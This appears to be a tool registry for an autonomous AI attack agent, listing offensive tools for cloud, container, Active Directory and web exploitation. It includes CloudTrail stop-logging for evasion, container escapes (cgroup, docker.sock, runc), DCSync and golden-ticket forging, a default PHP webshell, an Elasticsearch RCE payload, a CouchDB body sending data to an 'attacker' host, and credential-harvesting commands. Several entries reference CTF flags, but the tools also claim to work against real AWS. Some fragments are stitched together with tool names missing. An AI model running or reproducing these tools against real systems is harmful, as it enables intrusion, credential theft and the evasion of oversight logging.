tools.name: aws_cli
tools.description: Execute AWS CLI commands for cloud service exploitation. Supports S3 (s3 ls/cp/sync --no-sign-request), IAM (iam list-roles/get-policy/attach-role-policy/simulate-principal-policy), STS (sts assume-role/get-caller-identity/assume-role-with-web-identity/assume-role-with-saml), KMS (kms decrypt/list-keys), Lambda (lambda list-functions/invoke/create-function), SQS (sqs list-queues/receive-message), DynamoDB (dynamodb list-tables/scan/query), Organizations (organizations describe-organization/list-accounts/list-policies/list-targets-for-policy/describe-policy/detach-policy/disable-policy-type), CloudFormation (cloudformation create-stack/validate-template/describe-stacks), CloudTrail (cloudtrail describe-trails/get-trail-status/get-event-selectors/stop-logging). For LOCAL cloud simulators (not real AWS), add '--endpoint-url http://localhost:PORT' or '--endpoint-url http://127.0.0.1:PORT' in payload_json to target the local service. Automatically uses IMDS credentials when running on EC2. For unauthenticated S3 access, add '--no-sign-request' to payload_json.

service.description: AWS service: s3, iam, sts, kms, lambda, sqs, dynamodb, organizations, cloudformation, cloudtrail. Use 'organizations' for SCP bypass and account enumeration. Use 'cloudformation' for template injection attacks. Use 'cloudtrail' for logging evasion and trail enumeration.

action.description: AWS CLI action: ls, cp, sync, list-roles, get-policy, get-role, attach-role-policy, simulate-principal-policy, assume-role, assume-role-with-web-identity, assume-role-with-saml, get-caller-identity, decrypt, list-functions, invoke, create-function, list-queues, receive-message, list-tables, scan, query, describe-organization, list-accounts, list-policies, list-targets-for-policy, describe-policy, detach-policy, disable-policy-type, create-stack, validate-template, describe-stacks, describe-trails, get-trail-status, get-event-selectors, stop-logging

resource.description: Resource identifier (e.g., 's3://bucket-name', 'role/role-name', '--function-name NAME', '--queue-url URL', '--table-name NAME'). Leave empty for list operations.

payload_json.description: Additional flags, --query filters, or JSON payload. Examples: '--no-sign-request' (anonymous S3), '--endpoint-url http://localhost:10704' (local cloud simulator), '--role-session-name test', '--max-number-of-messages 10', '--filter-expression "attribute_exists(flag)"', '--query "Buckets[].Name"'

tools.name: aws_iam_federation
tools.description: Execute AWS IAM cross-account attacks and federation abuse. Supports: cross-account AssumeRole chaining (use when you have credentials from IMDS and want to access another account), OIDC federation (AssumeRoleWithWebIdentity with JWT token — use for CLOUD-11 and OIDC-based attacks), SAML federation (AssumeRoleWithSAML for Golden SAML CLOUD-13), AWS Organizations enumeration (list accounts/policies), SCP bypass evaluation (simulate-principal-policy), and cross-account S3 access with temporary credentials.

action.description: Federation action: assume-role, assume-role-with-web-identity, assume-role-with-saml, enumerate-organizations, scp-evaluate, cross-account-s3

role_arn.description: Role ARN to assume (e.g. arn:aws:iam::ACCOUNT:role/ROLENAME). Also used as Policy ID for scp-evaluate.

source_profile.description: AWS profile name for source credentials (default: uses env vars from IMDS)

web_identity_token.description: JWT/OIDC token for AssumeRoleWithWebIdentity (extracted from OIDC provider URL or forged)

saml_assertion.description: SAML assertion XML for AssumeRoleWithSAML (base64-encoded or raw XML)

role_session_name.description: Session name for the assumed role session (default: darwin-session)

endpoint_url.description: Custom endpoint URL for local cloud simulators (e.g. http://localhost:PORT)

tools.name: aws_sts_query
tools.description: Send AWS STS Query API request directly via HTTP POST to an STS-compatible endpoint (local simulator or real AWS). No AWS CLI required. Use for AssumeRole, GetCallerIdentity, GetSessionToken against cloud IAM simulators. Set api_version='2010-05-08' to bypass SCP enforcement via legacy API version. Automatically parses XML credentials from the response. IMPORTANT: RoleArn MUST be the full ARN format (arn:aws:iam::ACCOUNT:role/ROLENAME) — short role names will fail with 'Role not found'.

endpoint_url.description: STS API endpoint URL, e.g. http://127.0.0.1:10702 or http://localhost:PORT

access_key_id.description: AWS Access Key ID (from IMDS metadata or known credentials)

secret_access_key.description: AWS Secret Access Key (from IMDS metadata or known credentials)

role_arn.description: FULL Role ARN (REQUIRED format: arn:aws:iam::ACCOUNT:role/ROLENAME). Short role names will fail. Get the full ARN from GET /roles endpoint.

role_session_name.description: Session name for assumed role session (default: darwin)

api_version.description: AWS API version. Use '2010-05-08' to bypass SCP enforcement via legacy API (default: 2011-06-15)

insecure.description: Skip TLS verification for self-signed certs

tools.description: Execute Azure CLI commands. Supports: vm (list/show), storage (account/blob/container list/show), ad (user/service-principal list), role (assignment list), keyvault (secret list/show), acr (repository list/show), functionapp (list/show). Use with Azure IMDS Managed Identity from check_cloud_metadata. Authenticate via 'az login --identity' for Managed Identity.

service.description: Azure service: vm, storage, ad, role, keyvault, acr, functionapp

action.description: Action: list, show, download, create, get-policy, set-policy

resource.description: Resource identifier (e.g. resource group name, storage account name, key vault name)

tools.name: bloodyad_dacl
tools.description: AD DACL abuse via bloodyAD (AD-19, AD-20). Supports: set owner (WriteOwner), add GenericAll (ForceChangePassword), shadow credentials add, and other DACL modifications. Use when you have an account with write privileges over a target object but no direct control.

action.description: Action: set owner, add GenericAll, add groupMember, set password, shadowCredentials

target_object.description: Target DN or sAMAccountName to modify

extra.description: Extra arguments (e.g. new owner DN for set owner)

tools.name: certipy_adcs
tools.description: Enumerate ADCS for vulnerable certificate templates (ESC1-ESC8). Use when domain enumeration discovers a CA server. ESC1: overly permissive enrollment agent. ESC2: template allows request without signature. ESC3: enrollment agent template without authorization. ESC4: vulnerable ACL on template. ESC6: CA Flag EDITF_ATTRIBUTESUBJECTALTNAME2. ESC8: NTLM relay to HTTP endpoint.

ca_server.description: CA server hostname/IP (discovered via certipy find or ldapsearch)

tools.name: certipy_req
tools.description: Request certificate from ADCS using vulnerable template (ESC1-3 exploitation). Outputs .pfx for PKINIT authentication.

tools.name: check_capabilities
tools.description: Check container capabilities AND generate exploitation commands for dangerous capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_DAC_READ_SEARCH, CAP_NET_RAW, CAP_SYS_MODULE).

tools.name: check_cloud_metadata
tools.description: Check cloud metadata endpoints for AWS, GCP, Azure, Alicloud, and DigitalOcean. Extracts instance info, IAM credentials, and service account tokens. Use when inside a container or VM on cloud infrastructure — cloud credentials can enable lateral movement to cloud services.

tools.name: check_mounts
tools.description: Check mounted filesystems AND generate exploitation commands for dangerous mounts (docker.sock, hostPath, CRI socket, /proc access, /sys access).

tools.name: cloud_discovery_aws
tools.description: Run one strictly read-only AWS discovery action through argv; rejects mutating actions and non-local custom endpoints.

service.description: AWS service (sts, ec2, eks, elbv2, rds, s3api, iam).

action.description: Allow-listed read-only action for the service.

resource.description: Optional resource identifiers/flags, parsed as argv tokens.

tools.name: cloud_discovery_command
tools.description: Run one allow-listed read-only Kubernetes discovery command through the recon gateway.

command.description: One of the fixed read-only discovery commands.

tools.name: command_injection_test
tools.description: Test for command injection using multiple probe techniques

insecure.description: Skip TLS verification for self-signed certs

tools.name: container_escape_cap_dac
tools.description: Read host files using CAP_DAC_READ_SEARCH capability. Tries multiple methods: /proc/1/root, nsenter, and direct read with DAC bypass. Use when check_capabilities shows CAP_DAC_READ_SEARCH. Start with target_file='/etc/shadow' or target_file='/flag.txt'.

target_file.description: Absolute path to file to read from host (default /etc/shadow). Also try: /flag*, /root/.ssh/id_rsa, /home/*/.ssh/

ref_file.description: Known bind-mounted file to use as reference (default /etc/hostname)

tools.name: container_escape_cgroup
tools.description: ESCAPE privileged container via cgroup release_agent (cgroup v1). Requires SYS_ADMIN capability. Mounts cgroup fs, sets release_agent to execute a script on the HOST. Use ONLY when check_capabilities shows SYS_ADMIN. Start with shell_cmd='cat /flag*' or 'find / -name flag* 2>/dev/null'.

shell_cmd.description: Shell command to execute on the HOST (e.g. 'id', 'cat /etc/shadow', 'find / -name flag*')

subsystem.description: Cgroup subsystem to use: memory (default, most common), rdma, or misc. Try memory first.

tools.name: container_escape_docker_api
tools.description: ESCAPE container via Docker TCP API (port 2375, no auth). Creates privileged container with host root mounted. Use ONLY after container_find_docker confirms TCP Docker API is reachable. Start with shell_cmd='cat /host/flag*' to find flags. Differs from docker_sock escape — this works over TCP network, not UNIX socket.

host.description: Docker API host IP or hostname (e.g. 'localhost', '10.0.0.1')

port.description: Docker API TCP port (default 2375, also try 2376 for TLS)

shell_cmd.description: Command to execute on the HOST

tools.name: container_escape_docker_sock
tools.description: ESCAPE container via exposed docker.sock. Creates a privileged container with host root (/) mounted at /host, then runs your command on the HOST. Use ONLY after container_find_sockets confirms docker.sock exists. Start with shell_cmd='cat /host/flag*' to find flags on the host.

shell_cmd.description: Command to execute on the HOST via privileged container (e.g. 'cat /host/flag*', 'cat /host/etc/shadow')

tools.name: container_escape_mount_disk
tools.description: ESCAPE container by mounting a host disk partition. Auto-detects Linux host devices (/dev/sda1, /dev/vda1, /dev/xvda1) or accepts a specific device path. Mounts the device and reads files from the host filesystem. Use when you can see host block devices in /dev.

device_path.description: Path to host block device (e.g. '/dev/sda1'). Leave empty for auto-detection.

shell_cmd.description: Shell command to execute on mounted host fs

tools.name: container_escape_procfs
tools.description: ESCAPE container via host /proc mount. If the host's /proc is visible, /proc/<pid>/root/ points to the HOST root filesystem. Use when check_mounts shows /proc from host. Access host files via /proc/1/root/path/to/file. Try pid=1 first, then try other pids (bash, sh, sshd).

pid.description: Process ID on the HOST (default 1). Try 1, then check ps aux for other host PIDs.

shell_cmd.description: Shell command to run, prefixing host paths with /proc/{pid}/root/

tools.name: container_escape_runc
tools.description: Attempt CVE-2019-5736 runc container breakout. Exploits runc < 1.0.0-rc6 by overwriting /proc/self/exe. DESTRUCTIVE — overwrites runc binary on host. Use ONLY as last resort when docker.sock, cgroup, cap_dac, and mount_disk all fail. The payload_cmd is executed on the HOST the next time someone runs 'docker exec' in this container.

payload_cmd.description: Command to execute on host when runc is triggered (default sends flag to /tmp/runc_flag_out.txt)

tools.name: container_find_docker
tools.description: Locate Docker daemon via UNIX socket and TCP ports. Checks: (1) common docker.sock paths, (2) TCP ports 2375/2376, (3) DOCKER_HOST env var. Use after container_find_sockets to confirm Docker availability before escape.
tools.command_template: echo '[1] Checking docker.sock...' && ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null; echo '[2] Scanning Docker TCP ports (2375,2376)...' && (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || cat /proc/net/tcp 2>/dev/null) | grep -E '2375|2376'; echo '[3] Checking DOCKER_HOST env...' && env 2>/dev/null | grep -i docker; echo '---DONE---'

tools.name: container_find_sockets
tools.description: Search for UNIX domain sockets on the filesystem. Use when inside a container to find docker.sock, containerd.sock, or other exploitable sockets. Common paths: /var/run, /run, /tmp. Differs from check_mounts — this finds sockets, not mount points.

path.description: Root path to start scanning from (default '/')

tools.name: container_recon_env
tools.description: Scan container environment variables and /proc/*/environ for secrets (passwords, tokens, API keys, credentials). Use when inside a container to find credentials for lateral movement or cloud access. This is the container equivalent of linux_priv_check — discovers what's available before exploitation.
tools.command_template: echo '[ENV Secrets]' && env 2>/dev/null | grep -iE 'password|secret|token|key|cred|api|auth' | grep -v '^_='; echo '[ProcFS /proc/1/environ]' && (cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'password|secret|token|key|cred|api|auth' || echo 'not-accessible'); echo '[ProcFS scan]' && for p in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | head -20); do found=$(cat /proc/$p/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'password|secret|token|key' | head -2); if [ -n "$found" ]; then echo "PID $p: $found"; fi; done; echo '---DONE---'

tools.name: couchdb_query
tools.description: Interact with CouchDB REST API. Supports database enumeration ('/_all_dbs'), document access ('/db/doc_id'), user management ('/_users/org.couchdb.user:admin'), and replication trigger with privilege escalation ('/_replicate' — create admin user then replicate to gain access). Default port 5984. Many CouchDB instances allow unauthenticated access. Use the /_replicate endpoint with target pointing to a user DB for privilege escalation to create an admin account.

body_json.description: JSON body for POST/PUT requests. Example for replication attack: '-d \'{"source":"flagdb","target":"http://attacker:5984/leaked"}\''. For user creation: '-d \'{"name":"admin","password":"hacked","roles":["_admin"],"type":"user"}\''

tools.name: crictl_cmd
tools.description: Interact with containerd/CRI-O runtime via crictl. Use for K8S-16 CRI socket attacks - when /run/containerd/containerd.sock is mounted, bypass K8s API and directly control containers on the node. Actions: 'pods' (list pods), 'ps -a' (list all containers), 'inspect CONTAINER_ID' (container details), 'exec CONTAINER_ID CMD' (execute in container), 'images' (list images), 'pull IMAGE' (pull image).

action.description: CRI action: pods, ps, inspect, exec, images, pull

args.description: Arguments for the action (container ID for inspect/exec, image name for pull, '-a' for ps)

tools.name: curl_get
tools.description: Make HTTP GET request. Use insecure=true for self-signed TLS. Supports file:// URLs and client certs (cert/key).

url.description: Target URL (also file:// for local files)

insecure.description: Skip TLS verification (set true for self-signed certs)

cert.description: Path to TLS client certificate file (for mutual TLS)

key.description: Path to TLS client key file (for mutual TLS)

tools.name: cve_lookup
tools.description: Look up CVE details from NIST NVD: CVSS score, severity, description, affected versions, and references. Use to assess vulnerability severity and find patches.

tools.name: ddg_web_search
tools.description: Search the internet via DuckDuckGo for current exploitation techniques, default credentials, version-specific PoCs, and recent CVEs. Use together with knowledge_search. Parameters: query (search terms), max_results (1-15, default 8).

query.description: Search query (e.g. 'MSSQL sa default password exploitation')

tools.name: dirb_scan
tools.description: Enumerate directories and files on a web server using dirb

tools.name: docker_registry
tools.description: Pull, tag, and push a Docker image to a target registry. Use for container registry poisoning attacks (K8S-09 supply chain).
tools.command_template: docker pull {image} 2>&1 && docker tag {image} {target_registry}/{image_name} 2>&1 && docker push {target_registry}/{image_name} 2>&1

tools.name: elasticsearch_query
tools.description: Query Elasticsearch REST API. Use for data extraction (search queries), index enumeration, and script injection attacks. method: GET for read, POST for search with body. path: API path (e.g. '/_cat/indices?v', '/_search', '/_cluster/health'). body_json: for POST, pass '-d {json}' with search body containing script_fields for script injection (Elasticsearch dynamic scripting). Unauth access common on default installations.

body_json.description: For POST/PUT: body as JSON string, prefixed with '-d ' (e.g. '-d \'{"query":{"match_all":{}}}\''). Leave empty for GET requests. For script injection: '-d \'{"script_fields":{"rce":{"script":"Runtime.getRuntime().exec(\\"id\\")"}}}\''

tools.name: etcdctl_get
tools.description: Query etcd key-value store directly. etcd stores all Kubernetes cluster state including Secrets. For HTTPS endpoints automatically adds --insecure-skip-tls-verify (override with insecure=false). Supports mutual TLS via cacert/cert/tls_key params. Use --prefix --keys-only for exploration, -o json for full values.

key.description: etcd key to read. Default '/' with --prefix for all keys, or a specific path like '/registry/secrets/namespace/secretname'

output_opts.description: Additional etcdctl options. Use '--prefix --keys-only' for key discovery, '-o json' for full value output of a specific key, '--prefix -o json' for all keys with values

insecure.description: Skip TLS certificate verification for HTTPS endpoints (default true). Set false if valid certs available.

cacert.description: Path to CA certificate for TLS verification (e.g. /etc/kubernetes/pki/etcd/ca.crt)

cert.description: Path to client certificate for mutual TLS (e.g. /etc/kubernetes/pki/etcd/server.crt)

tls_key.description: Path to client key for mutual TLS (e.g. /etc/kubernetes/pki/etcd/server.key)

tools.name: ffuf_fuzz
tools.description: Fuzz web parameters or paths using ffuf

tools.name: file_upload
tools.description: Upload a file via multipart POST (curl -F). Use for unauthenticated file upload exploits — WordPress plugin RCE, PHP webshell delivery, arbitrary file upload vulnerabilities. IMPORTANT: many plugin upload endpoints require additional POST parameters (IDs, directories, nonces). If you get HTTP 400/403/500, use extra_fields to add required form fields. Example: extra_fields={"eeSFL_ID":"1", "eeSFL_FileUploadDir":"/wp-content/uploads/"}

field.description: Form field name for the file (default: 'file')

filename.description: Filename to upload (default: 'payload.php'). Use .php extension for PHP webshells.

content.description: File content to upload (default: simple PHP webshell '<?php system($_GET["cmd"]); ?>')

extra_fields.description: Additional form fields as JSON object. REQUIRED for many plugins. Example: {"eeSFL_ID": "1", "eeSFL_FileUploadDir": "/wp-content/uploads/"} or {"action": "upload", "nonce": "..."}. Look for required POST params in plugin docs or error responses.

tools.name: form_extract
tools.description: Extract all HTML forms, inputs, and links from a URL. Returns structured JSON.

action.description: Action: instances, list, describe, ls, cp, roles, service-accounts, keys, get-iam-policy, set-iam-policy, decrypt

tools.name: getnthash

tools.name: gettgtpkinit
tools.description: Get Kerberos TGT via PKINIT using a certificate and private key (from Shadow Credentials attack). Use after pywhisker to authenticate as the target user. Outputs a ccache file for use with impacket tools.

key_pem.description: Path to private key PEM file

tools.name: go_exploitdb_search
tools.description: Search local go-exploitdb for public exploits matching a CVE ID or keyword. Returns exploit type, description, and references. Requires go-exploitdb database (fetch with: go-exploitdb fetch).

query.description: CVE ID or keyword to search for (e.g. 'CVE-2021-44228', 'Apache')

tools.name: gobuster_dir
tools.description: Fast directory brute-force using gobuster. Uses raft-large-directories.txt wordlist by default. Automatically skips TLS verification (-k) for self-signed certs. Target URL must include scheme (e.g. https://host:port).

url.description: Alias for target_url — same as target_url parameter

tools.name: gpp_decrypt
tools.description: Decrypt a Microsoft GPP (Group Policy Preferences) cpassword value from SYSVOL Groups.xml. Decrypts AES-256-CBC encrypted passwords using the publicly documented Microsoft GPP key. Use after retrieving Groups.xml via smb_client from \\DOMAIN\SYSVOL. Input is the base64-encoded cpassword string from the XML.

cpassword.description: Base64-encoded cpassword value from Groups.xml (e.g. from <Properties cpassword='...'>)

tools.name: graphql_introspect
tools.description: Query a GraphQL endpoint for schema discovery and data extraction. Introspection mode dumps the full schema — all types, queries, mutations, and their arguments. Use for IDOR discovery: look for queries accepting user IDs or other identifiers that can be manipulated. Custom queries can extract data from discovered types.

query_type.description: 'introspection' for schema discovery, or 'query' to use custom query_body

query_body.description: Custom GraphQL query when query_type is 'query'. Example: '{getPrescriptions(userId:1){id medication}}'

tools.name: hash_crack
tools.description: Attempt to crack a password hash offline using hashcat or john-the-ripper. Auto-detects hash type from prefix ($krb5tgs$=Kerberoast mode 13100, $krb5asrep$=AS-REP mode 18200, 32-char hex=NTLM mode 1000, $2a$/$2b$=bcrypt mode 3200, $6$=SHA-512 mode 1800). Uses rockyou.txt wordlist by default. Specify hash_type manually if auto-detection fails. This is a general hash-cracking capability — it works against any compatible hash, not just Kerberos.

hash_string.description: Complete hash string (e.g. $krb5tgs$23$*... for Kerberoast, $krb5asrep$23$*... for AS-REP, or 32-char hex for NTLM)

hash_type.description: Optional hashcat mode number. Auto-detected from prefix if omitted. Common modes: 13100=Kerberoast, 18200=AS-REP, 1000=NTLM, 3200=bcrypt, 1800=SHA-512

timeout.description: Max cracking time in seconds (default 120, max 600)

tools.name: helm

For Helm v2 Tiller abuse (K8S-10): use '--host <tiller-svc>.<namespace>:44134 ls --all' to connect to an unauthenticated Tiller gRPC service and list releases. Use '--host <tiller-svc>.<namespace>:44134 get manifest <release>' to extract secrets from a release manifest. Do NOT use --tiller-namespace (Helm v2 only) - use --host for connecting to Tiller directly.

command.description: Full helm command. For Tiller: '--host <svc>.<ns>:44134 ls --all'

tools.description: AS-REP Roasting: request TGT for users without Kerberos pre-authentication. Hashcat-format output for offline cracking. Set user='' and password='' for unauthenticated AS-REP roasting with -no-pass.

tools.description: Run NTLM relay attack via impacket-ntlmrelayx. Use for AD CS ESC8 (AD-06, AD-Chain-2/3/6) — relay captured NTLM authentication to AD CS HTTP endpoint to obtain certificates. Target URL should point to the AD CS certsrv endpoint (e.g. 'http://dc/certsrv/certfnsh.asp'). Add '-smb2support' for SMBv2 targets.

target_url.description: Target URL to relay NTLM auth to (e.g. AD CS HTTP endpoint)

tools.name: impacket_psexec
tools.description: Execute commands on a remote Windows host via PsExec. Target format: DOMAIN/USER:PASSWORD@TARGET_IP

tools.name: impacket_pth
tools.description: Pass-the-Hash: execute commands on a remote Windows host using an NTLM hash instead of a password. Target format: DOMAIN/USER@TARGET_IP. Requires the user's NTLM hash (from secretsdump or DCSync).

tools.name: impacket_secretsdump
tools.description: Dump SAM/LSA secrets from a target using impacket-secretsdump. Target format: DOMAIN/USER:PASSWORD@TARGET_IP

tools.name: impacket_secretsdump_dcsync
tools.description: DCSync: replicate domain credentials from a Domain Controller. Requires Replication-Get-Changes-All privilege. Target format: DOMAIN/USER:PASSWORD@DC_IP

tools.name: impacket_silver_ticket
tools.description: Silver Ticket: forge a Kerberos TGS (service ticket) using the target service account's NTLM hash. Grants access to a specific service (e.g. 'cifs/dc.domain.com', 'http/web.domain.com') without domain admin privileges. Requires the service account's NTLM hash and domain SID.

service_hash.description: Target service account NTLM hash (32 hex chars)

tools.name: impacket_ticketer
tools.description: Golden Ticket: forge a Kerberos TGT using the KRBTGT account hash. Grants domain-wide persistence and privilege escalation. Requires KRBTGT NTLM hash and domain SID.

tools.name: impacket_wmiexec
tools.description: Execute commands via WMI on a remote Windows host. Target format: DOMAIN/USER:PASSWORD@TARGET_IP

tools.name: jwt_forge
tools.description: Forge a JSON Web Token (JWT) using a known secret or signing key. Use for authentication bypass when a JWT secret is hardcoded or discovered. Pass claims as base64-encoded JSON string (use base64.b64encode on the JSON claims).

algorithm.description: JWT algorithm: HS256, HS384, HS512, RS256, or 'none' (unsigned alg:none attack). Default HS256.

import json, sys

import socket, struct
host = '{target_host}'
port = {tns_port}
sid = '{sid}'
desc = f'(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST={{host}})(PORT={{port}}))(CONNECT_DATA=(SID={{sid}})))'
payload = desc.encode()
pkt_len = len(payload) + 8
header = struct.pack('>HH', pkt_len, 6) + b'\\x00\\x00\\x00\\x00\\x00'
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
try:
    sock.connect((host, port))
    sock.send(header + payload)
    resp = sock.recv(4096)
    print(f'Sent TNS CONNECT packet to {{host}}:{{port}} for SID={{sid}}')
    print(f'Response ({{len(resp)}} bytes): {{resp[:500]}}')
    sock.close()
except Exception as e:
    print(f'TNS error: {{e}}')
" 2>&1 | head -50

tools.name: tool_registry_get
tools.description: Return the full contract (ToolSpec) for ONE tool: parameter names with types/required/defaults, aliases, executor, dependencies. ALWAYS call this before writing task params so parameter names are exact.

tools.name: tool_registry_list
tools.description: List available tools. Returns compact entries (name, description, domains, capability, executor) filtered by optional domain/capability/keyword. Use BEFORE selecting a tool to discover what is available for the current scenario (web, db, cloud, k8s, container, ad, network).

domain.description: Optional domain filter (e.g. web, db, cloud, k8s, container, ad, network).

keyword.description: Optional substring match against tool name or description.

tools.name: try_login
tools.description: Try to log in to a web app. Auto-detects forms, handles multi-step login, CSRF tokens. Returns session cookie on success.

url.description: Base URL of the web application

tools.name: whatweb_scan
tools.description: Identify web technologies used by a target (lightweight, max 30s)

tools.name: wp_xmlrpc_brute
tools.description: Brute-force WordPress credentials via xmlrpc.php using wp.getUsers method. Use when you have identified a WordPress site and need to test weak credentials. Provide comma-separated username and password lists.
tools.command_template:
python3 -c "
import requests, sys
url = '{target_url}/xmlrpc.php'
users = '{users}'.split(',')
passwords = '{passwords}'.split(',')
for u in users:
    for p in passwords:
        xml = '''<?xml version=\\\"1.0\\\"?><methodCall><methodName>wp.getUsers</methodName><params><param><value><string>'''+u+'''</string></value></param><param><value><string>'''+p+'''</string></value></param></params></methodCall>'''
        try:
            r = requests.post(url, data=xml, timeout=10)
            if r.status_code == 200 and 'faultCode' not in r.text:
                print(f'SUCCESS: {{u}}:{{p}}')
                print(r.text[:500])
        except: pass
" 2>&1 | head -50

tools.name: wpscan_enum
tools.description: WordPress vulnerability scanner using wpscan. Enumerate plugins, themes, users, and vulnerable components. Use when whatweb_scan identifies a WordPress installation. If no API token is available, vulnerability checking (vp/vt) degrades to plugin/theme listing (p/t) automatically.

enum_mode.description: Enumeration mode: 'vp' (vulnerable plugins), 'vt' (vulnerable themes), 'u' (users), 'p' (all plugins), 't' (all themes), or combined e.g. 'p,u'

api_token.description: WPScan API token (leave empty if not available — plugin/theme/user listing still works)

tools.name: xss_reflection_test
tools.description: Test for XSS by sending GET/POST payloads and checking reflection

method.description: HTTP method (GET or POST, default GET)

insecure.description: Skip TLS verification for self-signed certs

tools.name: xxe_inject
tools.description: Send XXE (XML External Entity) payloads to read files or perform SSRF. Constructs external entity definitions targeting file:// paths. Supports inline DTD file read and external DTD mode for blind XXE. Also probes SSRF via XXE to cloud metadata endpoint (169.254.169.254). Sends requests with Content-Type: application/xml.

target_url.description: Target URL that accepts XML input (e.g. 'http://target:10113/import')

read_file.description: File path to read via XXE (default '/flag.txt'). Try '/flag.txt', '/FLAG.txt', '/etc/passwd', 'C:\\flag.txt'.

custom_xml.description: Custom XML body with XXE payload (optional — if empty, auto-generates standard payloads)

use_dtd.description: Enable blind XXE with parameter entity + external DTD (requires out-of-band server)

tools.name: ysoserial_generate
tools.description: Generate Java deserialization payload using ysoserial. AUTO mode tries CommonsCollections6→Beanutils1→Groovy→Jdk7u21→Spring1 in order. Returns the first valid payload with delivery guidance (Tomcat session PUT, raw body, etc.). For Java deserialization vulnerabilities: WEB-01 (Tomcat CVE-2025-24813), RMI, JMX, JNDI injection.

gadget.description: Gadget chain name, or 'auto' for sequential trial (default: auto)

target_url.description: Optional target URL for delivery guidance
